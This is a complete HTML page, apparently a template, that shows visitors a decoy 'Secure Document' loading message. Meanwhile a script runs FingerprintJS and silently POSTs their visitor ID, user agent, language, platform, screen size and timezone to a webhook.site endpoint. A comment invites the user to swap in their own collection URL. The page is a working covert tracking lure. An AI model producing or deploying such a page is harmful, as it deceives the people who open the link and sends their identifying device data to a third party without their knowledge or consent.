<!DOCTYPE html>
<html>
<head>
  <title>Device Fingerprint Logger</title>
  <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
</head>
<body>
  <h2>Secure Document</h2>
  <p>Loading secure information...</p>

  <script>
    const LOG_ENDPOINT = "https://webhook.site/c47ebc0a-0fcc-4657-bc7b-cb9d0c0d0c71"; // Replace with your URL

    FingerprintJS.load().then(fp => {
      fp.get().then(result => {
        const visitorId = result.visitorId;
        const data = {
          visitorId: visitorId,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          screen: screen.width + "x" + screen.height,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        fetch(LOG_ENDPOINT, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });

        console.log("Fingerprint sent:", data);
      });
    });
  </script>
</body>
</html>
